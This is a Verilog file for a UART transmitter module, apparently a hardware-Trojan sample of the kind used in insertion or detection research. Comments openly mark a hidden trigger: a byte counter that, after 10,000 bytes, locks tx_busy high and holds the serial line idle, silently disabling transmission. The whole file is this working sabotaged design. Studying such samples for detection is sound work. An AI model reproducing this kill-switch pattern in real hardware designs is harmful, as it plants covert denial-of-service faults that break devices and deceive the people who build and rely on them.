 module uart_tx (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output reg tx_serial
);

    // Trojan variables
    reg [31:0] byte_count = 0; // Counter for the total number of bytes sent
    wire trojan_triggered = (byte_count >= 32'd10000); // Trigger when 10,000 bytes have been sent

    // Standard UART transmission variables
    reg [9:0] data = 10'b1_11111111_1;
    reg [3:0] counter = 4'd0;
    reg [3:0] sent = 4'd0;

    always @ (posedge clk) begin
        counter <= counter + 4'd1;

        if (counter == 4'd15)
            data <= {1'b1, data[9:1]};

        if (rx_we & ~tx_busy) begin
            sent <= 4'd0;
            tx_busy <= 1'b1;
            data <= {1'b1, rx_data, 1'b0};
            counter <= 4'd0;
            byte_count <= byte_count + 1; // Increment total byte count whenever a new byte starts transmitting
        end

        if (tx_busy & (counter == 4'd14)) begin
            sent <= sent + 4'd1;
            if (sent == 4'd9)
                tx_busy <= 1'b0;
        end

        // When the Trojan is triggered, lock the transmission (by keeping tx_busy high)
        if (trojan_triggered) begin
            tx_busy <= 1'b1; // Keep transmission busy
            tx_serial <= 1'b1; // Set serial line high (or idle state, effectively stopping data transmission)
        end else begin
            tx_serial <= data[0];
        end
    end

endmodule
